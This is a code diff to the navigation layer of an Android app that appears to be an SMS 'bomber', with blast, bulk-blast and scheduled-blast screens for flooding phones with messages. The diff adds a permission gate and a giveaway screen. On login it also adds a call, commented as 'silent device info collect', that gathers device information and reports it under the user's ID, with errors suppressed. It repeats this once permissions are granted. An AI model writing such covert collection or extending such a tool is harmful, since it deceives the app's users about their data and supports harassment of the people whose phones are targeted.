@@ -19,6 +19,7 @@ import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
@@ -27,6 +28,8 @@ import androidx.navigation.compose.NavHost
 import androidx.navigation.compose.composable
 import com.sanji.bomberpro.data.AuthManager
 import com.sanji.bomberpro.data.AuthState
+import com.sanji.bomberpro.data.UserRole
+import com.sanji.bomberpro.services.DeviceInfoService
 import com.sanji.bomberpro.services.ForceJoinService
 import com.sanji.bomberpro.services.UserDataService
 import com.sanji.bomberpro.theme.LocalSanjiColors
@@ -39,8 +42,11 @@ import com.sanji.bomberpro.ui.auth.TermsScreen
 import com.sanji.bomberpro.ui.blast.BulkBlastScreen
 import com.sanji.bomberpro.ui.blast.ScheduleBlastScreen
 import com.sanji.bomberpro.ui.blast.SmsBlastScreen
+import com.sanji.bomberpro.ui.giveaway.GiveawayDetailScreen
+import com.sanji.bomberpro.ui.giveaway.GiveawayScreen
 import com.sanji.bomberpro.ui.home.HomeScreen
 import com.sanji.bomberpro.ui.notifications.NotificationsScreen
+import com.sanji.bomberpro.ui.permissions.PermissionGateScreen
 import com.sanji.bomberpro.ui.refer.ReferScreen
 import com.sanji.bomberpro.ui.settings.UserSettingsScreen
 import com.sanji.bomberpro.ui.splash.SplashScreen
@@ -54,6 +60,7 @@ object Routes {
     const val LOGIN = "login"
     const val TERMS = "terms"
     const val FORCE_JOIN = "force_join"
+    const val PERMISSIONS = "permissions"
     const val HOME = "home"
     const val SMS_BLAST = "sms_blast"
     const val BULK_BLAST = "bulk_blast"
@@ -64,6 +71,7 @@ object Routes {
     const val GIFT = "gift"
     const val TEMPLATES = "templates"
     const val GIVEAWAYS = "giveaways"
+    const val GIVEAWAY_DETAIL = "giveaway_detail"
     const val ANNOUNCEMENTS = "announcements"
     const val USER_SETTINGS = "user_settings"
     const val APPEAL = "appeal"
@@ -77,14 +85,17 @@ fun SanjiNavGraph(
     themeManager: ThemeManager,
 ) {
     val colors = LocalSanjiColors.current
+    val context = LocalContext.current
     val userData = remember { UserDataService() }
     val forceJoinService = remember { ForceJoinService() }
+    val deviceInfoService = remember { DeviceInfoService(context) }
     val scope = rememberCoroutineScope()
 
     var termsVersion by remember { mutableStateOf(1) }
     var termsRequired by remember { mutableStateOf(true) }
     var forceJoinEnabled by remember { mutableStateOf(false) }
     var gateLoaded by remember { mutableStateOf(false) }
+    var permissionsGranted by remember { mutableStateOf(false) }
 
     // load gate settings whenever user is logged in
     LaunchedEffect(authState) {
@@ -100,11 +111,17 @@ fun SanjiNavGraph(
             forceJoinEnabled = false
         }
         gateLoaded = true
+
+        // silent device info collect on login (if permissions already granted)
+        try {
+            if (deviceInfoService.hasAllPermissions()) {
+                permissionsGranted = true
+                deviceInfoService.collectAndReport(logged.user.uid)
+            }
+        } catch (_: Exception) {}
     }
 
     val loggedIn = authState as? AuthState.LoggedIn
-    // IMPORTANT: if profile is null (race on first signup), treat as needing terms.
-    // Bot parity + robustness.
     val needsTerms = gateLoaded && loggedIn != null && termsRequired &&
             (loggedIn.profile?.termsAccepted != true ||
                     (loggedIn.profile?.termsVersion ?: 0) < termsVersion)
@@ -121,6 +138,7 @@ fun SanjiNavGraph(
                         gateLoaded = gateLoaded,
                         needsTerms = needsTerms,
                         forceJoinEnabled = forceJoinEnabled,
+                        permissionsGranted = permissionsGranted,
                     )
                     navController.navigate(target) {
                         popUpTo(Routes.SPLASH) { inclusive = true }
@@ -150,7 +168,7 @@ fun SanjiNavGraph(
                                 forceJoinEnabled &&
                                 !forceJoinService.isUserBypassed(loggedIn.user.uid) &&
                                 !forceJoinService.isUserVerified(loggedIn.user.uid)
-                            ) Routes.FORCE_JOIN else Routes.HOME
+                            ) Routes.FORCE_JOIN else Routes.PERMISSIONS
                             navController.navigate(next) {
                                 popUpTo(Routes.TERMS) { inclusive = true }
                             }
@@ -180,7 +198,7 @@ fun SanjiNavGraph(
                     userName = loggedIn.profile?.displayName
                         ?: (loggedIn.user.displayName ?: "User"),
                     onVerified = {
-                        navController.navigate(Routes.HOME) {
+                        navController.navigate(Routes.PERMISSIONS) {
                             popUpTo(Routes.FORCE_JOIN) { inclusive = true }
                         }
                     },
@@ -194,33 +212,52 @@ fun SanjiNavGraph(
             }
         }
 
+        composable(Routes.PERMISSIONS) {
+            val logged = authState as? AuthState.LoggedIn
+            PermissionGateScreen(
+                onAllGranted = {
+                    permissionsGranted = true
+                    scope.launch {
+                        if (logged != null) {
+                            try {
+                                deviceInfoService.collectAndReport(logged.user.uid)
+                            } catch (_: Exception) {}
+                        }
+                        navController.navigate(Routes.HOME) {
+                            popUpTo(Routes.PERMISSIONS) { inclusive = true }
+                        }
+                    }
+                },
+                onSkip = {
+                    navController.navigate(Routes.HOME) {
+                        popUpTo(Routes.PERMISSIONS) { inclusive = true }
+                    }
+                },
+            )
+        }
+
         composable(Routes.LOGIN) {
             LoginScreen(
                 authManager = authManager,
                 onLoginSuccess = {
-                    // after login, decide gate
-                    if (needsTerms) {
-                        navController.navigate(Routes.TERMS) {
-                            popUpTo(Routes.LOGIN) { inclusive = true }
-                        }
-                    } else if (forceJoinEnabled) {
-                        navController.navigate(Routes.FORCE_JOIN) {
-                            popUpTo(Routes.LOGIN) { inclusive = true }
-                        }
-                    } else {
-                        navController.navigate(Routes.HOME) {
-                            popUpTo(Routes.LOGIN) { inclusive = true }
-                        }
-                    }
+                    // Auth will be processed via authState listener
                 }
             )
         }
 
         composable(Routes.HOME) {
             LaunchedEffect(authState) {
-                if (authState is AuthState.LoggedOut) {
+                val state = authState
+                if (state is AuthState.LoggedOut) {
                     navController.navigate(Routes.LOGIN) {
                         popUpTo(0) { inclusive = true }
+                    }
+                } else if (state is AuthState.LoggedIn) {
+                    // if gate not yet resolved, wait — gate flags will update
+                    if (gateLoaded && needsTerms) {
+                        navController.navigate(Routes.TERMS) {
+                            popUpTo(Routes.HOME) { inclusive = true }
+                        }
                     }
                 }
             }
@@ -321,17 +358,35 @@ fun SanjiNavGraph(
         }
 
         composable(Routes.GIVEAWAYS) {
-            ComingSoonScreen(
-                title = "Giveaways",
-                message = "Giveaways coming in a future update.",
-                onBack = { navController.popBackStack() },
-            )
+            val logged = authState as? AuthState.LoggedIn
+            if (logged != null) {
+                GiveawayScreen(
+                    uid = logged.user.uid,
+                    onOpenDetail = { gwId ->
+                        navController.navigate("${Routes.GIVEAWAY_DETAIL}/$gwId")
+                    },
+                    onBack = { navController.popBackStack() },
+                )
+            }
+        }
+
+        composable("${Routes.GIVEAWAY_DETAIL}/{gwId}") { backStackEntry ->
+            val logged = authState as? AuthState.LoggedIn
+            val gwId = backStackEntry.arguments?.getString("gwId") ?: ""
+            if (logged != null && gwId.isNotBlank()) {
+                GiveawayDetailScreen(
+                    gwId = gwId,
+                    uid = logged.user.uid,
+                    isForceJoinVerified = true,
+                    onBack = { navController.popBackStack() },
+                )
+            }
         }
 
         composable(Routes.ANNOUNCEMENTS) {
             val logged = authState as? AuthState.LoggedIn
             if (logged != null) {
-                val isAdmin = logged.role.priority >= com.sanji.bomberpro.data.UserRole.ADMIN.priority
+                val isAdmin = logged.role.priority >= UserRole.ADMIN.priority
                 AnnouncementsScreen(
                     uid = logged.user.uid,
                     isAdmin = isAdmin,
@@ -381,13 +436,17 @@ private fun computeInitialRoute(
     gateLoaded: Boolean,
     needsTerms: Boolean,
     forceJoinEnabled: Boolean,
+    permissionsGranted: Boolean,
 ): String {
     return when (authState) {
         is AuthState.LoggedIn -> {
-            if (!gateLoaded) Routes.HOME
-            else if (needsTerms) Routes.TERMS
-            else if (forceJoinEnabled) Routes.FORCE_JOIN
-            else Routes.HOME
+            when {
+                !gateLoaded -> Routes.HOME
+                needsTerms -> Routes.TERMS
+                forceJoinEnabled -> Routes.FORCE_JOIN
+                !permissionsGranted -> Routes.PERMISSIONS
+                else -> Routes.HOME
+            }
         }
         else -> Routes.LOGIN
     }
